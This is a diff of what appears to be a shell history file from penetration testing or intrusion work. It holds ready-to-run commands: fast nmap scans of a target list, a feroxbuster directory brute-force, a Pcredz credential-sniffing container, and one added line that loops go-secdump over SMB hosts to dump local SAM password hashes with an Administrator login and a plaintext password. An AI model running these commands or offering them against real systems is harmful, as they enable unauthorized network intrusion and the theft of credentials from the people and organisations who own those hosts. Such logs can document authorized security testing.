@@ -1,6 +1,7 @@
 : 1670248302:0;nmap -p 21-23,25,53,88,111,137,139,445,80,443,3389,8443,8080 -Pn -n -sS -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA nmapdiscovery -vvv --open -iL targets.txt
 : 1670248303:0;bash /opt/scripts/Gnmap-
 : 1670248303:0;cat * 
+: 1670248303:0;while read -r host; do /opt/go-secdump/go-secdump --host $host --user Administrator --pass 'pass1' --local --sam; done < 445.txt
 : 1670248303:0;nmap -p- -Pn -n -sS -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA nmapfull -vvv --open -iL targets-live.txt
 : 1670248304:0;feroxbuster --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" -k -T 3 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x html,php,txt,aspx -P http://127.0.0.1:8080 --rate-limit 100 --scan-limit 3 -u https://www.example.com
 : 1670248306:0;docker run --net=host -v $(pwd):/opt/Pcredz -it pcredz
